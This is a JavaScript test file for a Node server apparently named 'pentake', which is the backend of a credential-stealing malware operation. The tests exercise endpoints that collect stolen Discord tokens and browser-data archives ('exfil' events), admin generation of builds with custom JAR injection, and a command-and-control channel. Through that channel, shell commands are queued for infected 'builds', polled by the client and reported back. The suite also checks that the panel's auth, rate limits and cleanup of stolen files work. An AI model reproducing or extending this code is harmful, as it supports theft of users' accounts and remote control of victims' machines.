const assert = require('assert');
const http = require('http');
const path = require('path');
const fs = require('fs');
const os = require('os');
const { fork } = require('child_process');
const storageCleanup = require('../storage-cleanup');

// Isolate the database: each run gets a fresh SQLite file so tests never touch
// the dev database and can never conflict with a running production server.
const TEST_DB_PATH = path.join(__dirname, `test-${Date.now()}.sqlite`);
process.env.DB_PATH = TEST_DB_PATH;
process.env.ADMIN_PASSWORD = 'testadmincode2026';
process.env.API_KEY = 'test-api-key-12345';
process.env.SECRET_KEY = 'test-jwt-secret-key';

// Isolate on-disk storage: uploads and shared-files point at throwaway temp
// dirs so tests never touch the repo's real data or accumulate artifacts.
const TEST_ROOT = fs.mkdtempSync(path.join(os.tmpdir(), 'pentake-test-'));
process.env.UPLOADS_DIR = path.join(TEST_ROOT, 'uploads');
process.env.SHARED_FILES_DIR = path.join(TEST_ROOT, 'shared-files');
process.env.BUILDS_DIR = path.join(TEST_ROOT, 'builds');

const db = require('../db');

const TEST_PORT = 3000 + Math.floor(Math.random() * 900);

// ==================== HTTP HELPER ====================
function request(method, reqPath, body = null, headers = {}, rawBody = null) {
    return new Promise((resolve, reject) => {
        const payload = rawBody !== null ? rawBody : (body ? JSON.stringify(body) : '');
        const options = {
            hostname: 'localhost',
            port: TEST_PORT,
            path: reqPath,
            method: method,
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload),
                ...headers
            }
        };

        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                let parsed = data;
                try { parsed = JSON.parse(data); } catch (_) {}
                resolve({ status: res.statusCode, body: parsed, headers: res.headers });
            });
        });

        req.on('error', err => reject(err));
        if (payload) req.write(payload);
        req.end();
    });
}

// Extract auth_token cookie from set-cookie header
function extractAuthToken(setCookieHeader) {
    if (!setCookieHeader) return '';
    const cookieArray = Array.isArray(setCookieHeader) ? setCookieHeader : [setCookieHeader];
    const joined = cookieArray.join('; ');
    const match = joined.match(/auth_token=([^;]+)/);
    return match ? `auth_token=${match[1]}` : '';
}

// Build a multipart/form-data body holding N files (all under the `files`
// field name). Used by the shared-files upload tests.
function buildMultipart(files) {
    const boundary = '----pentake-upload-boundary';
    let body = '';
    for (const { name, content } of files) {
        body +=
            `--${boundary}\r\n` +
            `Content-Disposition: form-data; name="files"; filename="${name}"\r\n` +
            'Content-Type: application/octet-stream\r\n\r\n' +
            content +
            '\r\n';
    }
    body += `--${boundary}--\r\n`;
    return { body, contentType: `multipart/form-data; boundary=${boundary}` };
}

// Wait until the forked server answers instead of a fixed sleep.
async function waitForServer(serverProcess, timeoutMs = 20000) {
    const deadline = Date.now() + timeoutMs;
    while (Date.now() < deadline) {
        if (serverProcess.exitCode !== null) {
            throw new Error(`Server process exited early with code ${serverProcess.exitCode}`);
        }
        try {
            const res = await request('GET', '/login.html');
            if (res.status === 200) return;
        } catch (_) {}
        await new Promise(r => setTimeout(r, 100));
    }
    throw new Error('Server did not become ready within timeout');
}

// ==================== TEST RUNNER ====================
async function runTests() {
    console.log('[TEST SUITE] Starting automated verification...');
    console.log('');

    let testsPassed = 0;
    let testsFailed = 0;

    // Initialize DB (isolated test file), then pre-register a build ID so the
    // storage tests have a legitimate target.
    await db.initDatabase();
    await db.createBuild(1, 'user_1', 'test-target.jar', ['test.txt']);

    // Fork the server on a separate test port against the isolated DB
    const serverProcess = fork(
        path.join(__dirname, '../server.js'),
        [],
        {
            env: {
                ...process.env,
                PORT: String(TEST_PORT),
                DB_PATH: TEST_DB_PATH,
                ADMIN_PASSWORD: 'testadmincode2026',
                API_KEY: 'test-api-key-12345',
                SECRET_KEY: 'test-jwt-secret-key',
                NODE_ENV: 'test',
                UPLOADS_DIR: process.env.UPLOADS_DIR,
                SHARED_FILES_DIR: process.env.SHARED_FILES_DIR,
                BUILDS_DIR: process.env.BUILDS_DIR,
                // Tight limits so the anti-spam behaviour is exercisable in
                // the test window without burning a quota of real builds.
                BUILD_RATE_LIMIT: '2',
                MAX_SHARED_JARS: '2',
                CLEANUP_INTERVAL_MS: '3600000'
            },
            silent: true  // Suppress server stdout/stderr in test output
        }
    );

    await waitForServer(serverProcess);

    const pass = (n, msg) => { console.log(`  [TEST ${n}] PASS: ${msg}`); testsPassed++; };
    const fail = (n, msg, err) => { console.error(`  [TEST ${n}] FAIL: ${msg}`); if (err) console.error('     ', err.message || err); testsFailed++; };

    let standardCookie = '';
    let adminCookie = '';

    try {
        // ========== AUTH TESTS ==========
        console.log('--- Authentication & Registration ---');

        // Test 1: Register Standard User
        try {
            const res = await request('POST', '/api/auth/register', {
                username: 'agent_test_001',
                password: 'StrongPass!99',
                role: 'standard'
            });
            assert.strictEqual(res.status, 201, `Expected 201 got ${res.status}`);
            assert.strictEqual(res.body.status, 'ok');
            assert.strictEqual(res.body.user.role, 'standard');
            pass(1, 'Standard user registered successfully');
        } catch (e) { fail(1, 'Standard user registration', e); }

        // Test 2: Reject duplicate username
        try {
            const res = await request('POST', '/api/auth/register', {
                username: 'agent_test_001',
                password: 'AnotherPass!12',
                role: 'standard'
            });
            assert.strictEqual(res.status, 400, `Expected 400 got ${res.status}`);
            pass(2, 'Duplicate username correctly rejected');
        } catch (e) { fail(2, 'Duplicate username rejection', e); }

        // Test 3: Failed Admin Register (wrong code)
        try {
            const res = await request('POST', '/api/auth/register', {
                username: 'admin_test_001',
                password: 'AdminPass!99',
                role: 'admin',
                adminCode: 'wrongcode'
            });
            assert.strictEqual(res.status, 403, `Expected 403 got ${res.status}`);
            pass(3, 'Admin registration with invalid code correctly rejected');
        } catch (e) { fail(3, 'Admin code validation', e); }

        // Test 4: Successful Admin Register (correct code)
        try {
            const res = await request('POST', '/api/auth/register', {
                username: 'admin_test_001',
                password: 'AdminPass!99',
                role: 'admin',
                adminCode: 'testadmincode2026'
            });
            assert.strictEqual(res.status, 201, `Expected 201 got ${res.status}`);
            assert.strictEqual(res.body.user.role, 'admin');
            pass(4, 'Admin registered successfully with correct code');
        } catch (e) { fail(4, 'Admin registration', e); }

        // Test 5: Login Standard User & Receive JWT Cookie
        try {
            const res = await request('POST', '/api/auth/login', {
                username: 'agent_test_001',
                password: 'StrongPass!99'
            });
            assert.strictEqual(res.status, 200, `Expected 200 got ${res.status}`);
            assert.strictEqual(res.body.status, 'ok');
            assert.strictEqual(res.body.user.role, 'standard');
            
            standardCookie = extractAuthToken(res.headers['set-cookie']);
            assert.ok(standardCookie.includes('auth_token='), 'auth_token cookie must be present');
            
            // Security check: ensure no plaintext secrets are in cookies
            const rawSetCookie = JSON.stringify(res.headers['set-cookie'] || '');
            assert.ok(!rawSetCookie.includes('StrongPass!99'), 'Plaintext password must NOT appear in cookies');
            assert.ok(!rawSetCookie.includes('testadmincode2026'), 'Admin code must NOT appear in cookies');
            pass(5, 'Standard login succeeds with JWT cookie (no plaintext password in cookies)');
        } catch (e) { fail(5, 'Standard user login', e); }

        // Test 6: Login Admin User
        try {
            const res = await request('POST', '/api/auth/login', {
                username: 'admin_test_001',
                password: 'AdminPass!99'
            });
            assert.strictEqual(res.status, 200, `Expected 200 got ${res.status}`);
            adminCookie = extractAuthToken(res.headers['set-cookie']);
            assert.ok(adminCookie.includes('auth_token='), 'Admin auth_token cookie must be present');
            pass(6, 'Admin login succeeds');
        } catch (e) { fail(6, 'Admin user login', e); }

        // ========== SESSION TESTS ==========
        console.log('');
        console.log('--- Session Verification ---');

        // Test 7: Verify standard user session (/api/auth/me)
        try {
            const res = await request('GET', '/api/auth/me', null, { Cookie: standardCookie });
            assert.strictEqual(res.status, 200, `Expected 200 got ${res.status}`);
            assert.strictEqual(res.body.username, 'agent_test_001');
            assert.strictEqual(res.body.role, 'standard');
            pass(7, 'JWT session verification returns correct user claims');
        } catch (e) { fail(7, 'Session verification', e); }

        // Test 8: Unauthenticated request blocked
        try {
            const res = await request('GET', '/api/logs');
            assert.strictEqual(res.status, 401, `Expected 401 got ${res.status}`);
            pass(8, 'Unauthenticated request correctly blocked with 401');
        } catch (e) { fail(8, 'Unauthenticated request block', e); }

        // ========== ROLE-BASED ACCESS TESTS ==========
        console.log('');
        console.log('--- Role-Based Access Control ---');

        // Test 9: Standard user denied admin action logs endpoint
        try {
            const res = await request('GET', '/api/admin/action-logs', null, { Cookie: standardCookie });
            assert.strictEqual(res.status, 403, `Expected 403 got ${res.status}`);
            pass(9, 'Standard user cannot access admin action-logs (403 Forbidden)');
        } catch (e) { fail(9, 'Standard user admin endpoint rejection', e); }

        // Test 10: Admin user can access action logs
        try {
            const res = await request('GET', '/api/admin/action-logs', null, { Cookie: adminCookie });
            assert.strictEqual(res.status, 200, `Expected 200 got ${res.status}`);
            assert.ok(Array.isArray(res.body), 'Action logs response must be an array');
            pass(10, 'Admin user can access action-logs endpoint (200 OK)');
        } catch (e) { fail(10, 'Admin action-logs access', e); }

        // ========== EXFILTRATION SECURITY ==========
        console.log('');
        console.log('--- Exfiltration Endpoint Security ---');

        // Test 11: Exfil route rejected without API key
        try {
            const res = await request('POST', '/log', { message: 'test' }, {
                'x-build-id': 'user_1'
            });
            assert.strictEqual(res.status, 401, `Expected 401 got ${res.status}`);
            pass(11, 'Exfiltration route /log rejected: missing API key');
        } catch (e) { fail(11, 'Exfil without API key', e); }

        // Test 12: Exfil route rejected with wrong API key
        try {
            const res = await request('POST', '/log', { message: 'test' }, {
                'x-api-key': 'WRONG-KEY',
                'x-build-id': 'user_1'
            });
            assert.strictEqual(res.status, 401, `Expected 401 got ${res.status}`);
            pass(12, 'Exfiltration route /log rejected: wrong API key');
        } catch (e) { fail(12, 'Exfil with wrong API key', e); }

        // Test 13: Exfil route rejected with unregistered build ID
        try {
            const res = await request('POST', '/log', { message: 'test' }, {
                'x-api-key': 'test-api-key-12345',
                'x-build-id': 'user_99999'
            });
            // Should be 403 because user_99999 doesn't exist in the DB
            assert.ok([403, 401].includes(res.status), `Expected 403 or 401 got ${res.status}`);
            pass(13, 'Exfiltration route /log rejected: unregistered build ID');
        } catch (e) { fail(13, 'Exfil with unregistered build ID', e); }

        // Test 14: Legacy endpoint /log_data rejects a traversal trace ID
        try {
            const res = await request('POST', '/log_data', { hello: 'world' }, {
                'x-trace-id': '../escape'
            });
            assert.strictEqual(res.status, 400, `Expected 400 got ${res.status}`);
            pass(14, 'Legacy /log_data blocks directory traversal via X-Trace-ID');
        } catch (e) { fail(14, 'Legacy /log_data traversal rejection', e); }

        // Test 15: Legacy endpoint /v2/data rejects a traversal session ID
        try {
            const res = await request('POST', '/v2/data', { payload: 'AAAA' }, {
                'x-session-id': '../escape'
            });
            assert.strictEqual(res.status, 400, `Expected 400 got ${res.status}`);
            pass(15, 'Legacy /v2/data blocks directory traversal via X-Session-ID');
        } catch (e) { fail(15, 'Legacy /v2/data traversal rejection', e); }

        // Test 16: Legacy /log_files rejects a traversal session ID (multipart upload)
        try {
            const boundary = '----pentake-test-boundary';
            const multipartBody =
                `--${boundary}\r\n` +
                'Content-Disposition: form-data; name="file"; filename="a.txt"\r\n' +
                'Content-Type: text/plain\r\n\r\n' +
                'hello\r\n' +
                `--${boundary}--\r\n`;
            const res = await request('POST', '/log_files', null, {
                'x-session-id': '../escape',
                'Content-Type': `multipart/form-data; boundary=${boundary}`
            }, multipartBody);
            assert.strictEqual(res.status, 400, `Expected 400 got ${res.status}`);
            pass(16, 'Legacy /log_files blocks directory traversal via X-Session-ID');
        } catch (e) { fail(16, 'Legacy /log_files traversal rejection', e); }

        // ========== STORAGE TESTS (SQLite exfil events) ==========
        console.log('');
        console.log('--- Exfil Event Storage ---');

        // Test 17: Valid exfil writes land in SQLite as events
        try {
            const res = await request('POST', '/log', { message: 'hello-from-test' }, {
                'x-api-key': 'test-api-key-12345',
                'x-build-id': 'user_1'
            });
            assert.strictEqual(res.status, 200, `Expected 200 got ${res.status}`);
            const events = await db.listEvents('user_1', 'log');
            assert.ok(events.length >= 1, 'At least one log event must be stored');
            assert.ok(events[events.length - 1].data.includes('hello-from-test'), 'Event payload must match');
            pass(17, 'Exfil /log event written to SQLite');
        } catch (e) { fail(17, 'Exfil event storage', e); }

        // Test 18: Stats increment through meta.json after /discord.
        // meta.json is a lifetime counter on disk (shared with prior runs), so
        // assert on the delta rather than an absolute value.
        try {
            const before = await request('GET', '/api/logs', null, { Cookie: adminCookie });
            const beforeBuild = before.body.find(l => l.uuid === 'user_1');
            const beforeCount = (beforeBuild && beforeBuild.stats.discordtokencount) || 0;

            const res = await request('POST', '/discord', {
                token: 'test-token-abc',
                userInfo: { username: 'testuser' },
                friends: []
            }, {
                'x-api-key': 'test-api-key-12345',
                'x-build-id': 'user_1'
            });
            assert.strictEqual(res.status, 200, `Expected 200 got ${res.status}`);

            const after = await request('GET', '/api/logs', null, { Cookie: adminCookie });
            const build = after.body.find(l => l.uuid === 'user_1');
            assert.ok(build, 'Build folder must appear in /api/logs');
            assert.strictEqual(build.stats.discordtokencount, beforeCount + 1, 'discordtokencount must increment');
            assert.ok(build.events.some(e => e.type === 'discord'), 'Details must include discord event');
            pass(18, 'Meta stats increment and events surfaced via /api/logs');
        } catch (e) { fail(18, 'Discord stats + event surfacing', e); }

        // ========== CUSTOM JAR INJECTION & UPLOAD ACCESS ==========
        console.log('');
        console.log('--- Custom JAR Injection & File Upload Security ---');

        // Test 19: Standard user denied file upload endpoint
        try {
            const res = await request('POST', '/api/files/upload', {}, { Cookie: standardCookie });
            assert.strictEqual(res.status, 403, `Expected 403 got ${res.status}`);
            pass(19, 'Standard user cannot upload files (403 Forbidden)');
        } catch (e) { fail(19, 'Standard user upload rejection', e); }

        // Test 20: Admin user can access file upload endpoint
        try {
            const res = await request('POST', '/api/files/upload', {}, { Cookie: adminCookie });
            // Since no files were attached, it should pass requireAdmin but fail multer validation with 400 Bad Request
            assert.strictEqual(res.status, 400, `Expected 400 got ${res.status}`);
            assert.strictEqual(res.body.error, 'No files uploaded');
            pass(20, 'Admin user can access file upload endpoint (passed authentication)');
        } catch (e) { fail(20, 'Admin upload access', e); }

        // Test 21: Build generation fails fast when custom JAR does not exist
        try {
            const res = await request('POST', '/api/build/generate', { jarFilename: 'non_existent_custom_jar.jar' }, { Cookie: adminCookie });
            assert.strictEqual(res.status, 400, `Expected 400 got ${res.status}`);
            assert.strictEqual(res.body.error, 'Specified JAR does not exist on the server');
            pass(21, 'Build endpoint fail-fast on missing custom JAR (no path leakage)');
        } catch (e) { fail(21, 'Custom JAR validation', e); }

        // Test 22: Login rate limiter trips after sustained attempts
        try {
            let got429 = false;
            for (let i = 0; i < 25; i++) {
                const res = await request('POST', '/api/auth/login', {
                    username: 'agent_test_001',
                    password: 'wrong-password!'
                });
                if (res.status === 429) { got429 = true; break; }
                assert.strictEqual(res.status, 401, `Expected 401 got ${res.status}`);
            }
            assert.ok(got429, 'At least one request must be rate-limited (429)');
            pass(22, 'Login endpoint throttled after repeated failures');
        } catch (e) { fail(22, 'Login rate limiter', e); }

        // ========== REMOTE COMMAND CHANNEL ==========
        console.log('');
        console.log('--- Remote Command Channel ---');

        // Test 23: Issue a shell command to a build as admin
        let issuedCommandId = null;
        try {
            const res = await request('POST', '/api/commands/user_1', {
                type: 'shell',
                args: 'echo hello-from-c2'
            }, { Cookie: adminCookie });
            assert.strictEqual(res.status, 200, `Expected 200 got ${res.status}`);
            assert.ok(res.body.id, 'Must return command id');
            issuedCommandId = res.body.id;
            pass(23, 'Admin issues a shell command to a build');
        } catch (e) { fail(23, 'Issue command', e); }

        // Test 24: Client polls and receives its pending command
        try {
            const res = await request('GET', '/cmd/poll', null, {
                'x-api-key': 'test-api-key-12345',
                'x-build-id': 'user_1'
            });
            assert.strictEqual(res.status, 200, `Expected 200 got ${res.status}`);
            assert.strictEqual(res.body.ok, true);
            assert.ok(res.body.command, 'Must return a claimed command');
            assert.strictEqual(res.body.command.id, issuedCommandId);
            assert.strictEqual(res.body.command.type, 'shell');
            pass(24, 'Client polls and receives the pending command');
        } catch (e) { fail(24, 'Command poll', e); }

        // Test 25: Client uploads the result; admin sees it completed
        try {
            const res = await request('POST', '/cmd/result', {
                id: issuedCommandId,
                status: 'done',
                output: 'hello-from-c2'
            }, {
                'x-api-key': 'test-api-key-12345',
                'x-build-id': 'user_1'
            });
            assert.strictEqual(res.status, 200, `Expected 200 got ${res.status}`);

            const hist = await request('GET', '/api/commands/user_1', null, { Cookie: adminCookie });
            assert.strictEqual(hist.status, 200);
            const cmd = hist.body.find(c => c.id === issuedCommandId);
            assert.ok(cmd, 'Command must appear in history');
            assert.strictEqual(cmd.status, 'done');
            assert.strictEqual(cmd.result, 'hello-from-c2');
            pass(25, 'Client result stored and visible in command history');
        } catch (e) { fail(25, 'Command result + history', e); }

        // Test 26: A client cannot report completion for another build's command
        try {
            const res = await request('POST', '/cmd/result', {
                id: issuedCommandId,
                status: 'done',
                output: 'spoofed'
            }, {
                'x-api-key': 'test-api-key-12345',
                'x-build-id': 'user_OTHER'
            });
            // user_OTHER has no host path doc; validateApiKey treats it as an
            // unregistered-ish build only when it starts with user_ and has no DB
            // row — it is not registered, so expect 403 from validateApiKey.
            assert.ok([400, 403].includes(res.status), `Expected 400/403 got ${res.status}`);
            pass(26, 'Cross-build result spoofing rejected');
        } catch (e) { fail(26, 'Result spoof rejection', e); }

        // Test 27: Poll with no pending command returns null
        try {
            const res = await request('GET', '/cmd/poll', null, {
                'x-api-key': 'test-api-key-12345',
                'x-build-id': 'user_1'
            });
            assert.strictEqual(res.status, 200, `Expected 200 got ${res.status}`);
            assert.strictEqual(res.body.command, null);
            pass(27, 'Poll returns null when queue is empty');
        } catch (e) { fail(27, 'Empty command queue', e); }

        // ========== BUILD SPAM / JAR QUOTA / CLEANUP ==========
        console.log('');
        console.log('--- Build Anti-Spam, JAR Quota & Storage Cleanup ---');

        // Test 29: Build endpoint rate-limits after sustained calls
        try {
            let got429 = false;
            for (let i = 0; i < 10; i++) {
                const res = await request('POST', '/api/build/generate', { jarFilename: 'nope.jar' }, { Cookie: adminCookie });
                if (res.status === 429) { got429 = true; break; }
            }
            assert.ok(got429, 'At least one build request must be rate-limited (429)');
            pass(29, 'Build endpoint throttled after repeated calls');
        } catch (e) { fail(29, 'Build rate limiter', e); }

        // Test 30: JAR upload capped by MAX_SHARED_JARS quota
        try {
            const multipart = buildMultipart([
                { name: 'a.jar', content: 'PK-test-a' },
                { name: 'b.jar', content: 'PK-test-b' },
                { name: 'c.jar', content: 'PK-test-c' }
            ]);
            const res = await request('POST', '/api/files/upload', null, {
                Cookie: adminCookie,
                'Content-Type': multipart.contentType
            }, multipart.body);
            assert.strictEqual(res.status, 429, `Expected 429 got ${res.status}`);
            assert.ok(res.body.error.includes('Jar quota'), 'Error must mention the jar quota');
            pass(30, 'JAR upload exceeding quota rejected with 429');
        } catch (e) { fail(30, 'Jar upload quota', e); }

        // Test 31: Cleanup sweep purges stale exfil files but keeps fresh ones
        try {
            const probe = path.join(TEST_ROOT, 'cleanup-probe');
            const exfilDir = path.join(probe, 'uploads', 'user_777');
            fs.mkdirSync(exfilDir, { recursive: true });
            const oldFile = path.join(exfilDir, 'browser_data_1.zip');
            const freshFile = path.join(exfilDir, 'browser_data_2.zip');
            fs.writeFileSync(oldFile, 'stale');
            fs.writeFileSync(freshFile, 'fresh');
            fs.writeFileSync(path.join(exfilDir, 'meta.json'), '{}');
            // Backdate the stale file beyond the retention window
            const old = new Date(Date.now() - 10 * 24 * 60 * 60 * 1000);
            fs.utimesSync(oldFile, old, old);

            const result = await storageCleanup.runCleanupOnce({
                uploadsDir: path.join(probe, 'uploads'),
                sharedFilesDir: path.join(probe, 'shared-files'),
                buildsDir: path.join(probe, 'builds'),
                tempRetentionMs: 60 * 60 * 1000,
                uploadRetentionMs: 3 * 24 * 60 * 60 * 1000,
                sharedRetentionMs: 0,
                maxSharedJars: 20
            });

            assert.ok(!fs.existsSync(oldFile), 'Stale exfil file must be removed');
            assert.ok(fs.existsSync(freshFile), 'Fresh exfil file must survive');
            assert.ok(fs.existsSync(path.join(exfilDir, 'meta.json')), 'meta.json must survive');
            assert.strictEqual(result.uploadRemoved, 1, 'Exactly one upload must be purged');
            pass(31, 'Cleanup purges stale uploads and preserves fresh data');
        } catch (e) { fail(31, 'Cleanup retention sweep', e); }

        // Test 32: Cleanup enforces the shared jar cap (oldest jars trimmed)
        try {
            const probe = path.join(TEST_ROOT, 'cleanup-jars');
            const sharedDir = path.join(probe, 'shared-files');
            fs.mkdirSync(sharedDir, { recursive: true });
            const jarA = path.join(sharedDir, 'modA.jar');
            const jarB = path.join(sharedDir, 'modB.jar');
            const jarC = path.join(sharedDir, 'modC.jar');
            const stale = new Date(Date.now() - 5 * 24 * 60 * 60 * 1000);
            fs.writeFileSync(jarA, 'a'); fs.utimesSync(jarA, stale, stale);
            fs.writeFileSync(jarB, 'b'); fs.utimesSync(jarB, stale, stale);
            fs.writeFileSync(jarC, 'c');

            const result = await storageCleanup.runCleanupOnce({
                uploadsDir: path.join(probe, 'uploads'),
                sharedFilesDir: sharedDir,
                buildsDir: path.join(probe, 'builds'),
                tempRetentionMs: 60 * 60 * 1000,
                uploadRetentionMs: 365 * 24 * 60 * 60 * 1000,
                sharedRetentionMs: 0,
                maxSharedJars: 2
            });

            const remaining = fs.readdirSync(sharedDir).filter((f) => f.toLowerCase().endsWith('.jar'));
            assert.strictEqual(remaining.length, 2, 'Only the two newest jars must remain');
            assert.ok(remaining.includes('modC.jar'), 'Newest jar must be kept');
            assert.strictEqual(result.jarsRemoved, 1, 'One oversubscribed jar must be trimmed');
            pass(32, 'Cleanup trims shared jars down to the configured cap');
        } catch (e) { fail(32, 'Cleanup jar cap', e); }

        // ========== LOGOUT ==========
        console.log('');
        console.log('--- Logout Flow ---');

        // Test 28: Logout clears session
        try {
            const res = await request('POST', '/api/auth/logout', null, { Cookie: standardCookie });
            assert.strictEqual(res.status, 200, `Expected 200 got ${res.status}`);
            
            // Verify the Set-Cookie clears auth_token
            const setCookieStr = JSON.stringify(res.headers['set-cookie'] || '');
            assert.ok(setCookieStr.includes('auth_token=;') || setCookieStr.includes('auth_token=,'),
                'Logout must clear auth_token cookie');
            pass(28, 'Logout clears auth_token cookie');
        } catch (e) { fail(28, 'Logout flow', e); }

    } catch (globalErr) {
        console.error('\n[CRITICAL] Test runner encountered an unhandled error:');
        console.error(globalErr);
    } finally {
        serverProcess.kill();

        // Give the child a moment to die, then close our own DB handle and
        // remove the isolated SQLite file.
        await new Promise(r => setTimeout(r, 300));
        try {
            if (typeof db.close === 'function') db.close();
        } catch (_) {}
        try { fs.unlinkSync(TEST_DB_PATH); } catch (_) {}

        console.log('');
        console.log('====================================');
        console.log(`[RESULTS] ${testsPassed} passed, ${testsFailed} failed`);
        console.log('====================================');

        if (testsFailed > 0) {
            process.exit(1);
        } else {
            process.exit(0);
        }
    }
}

runTests();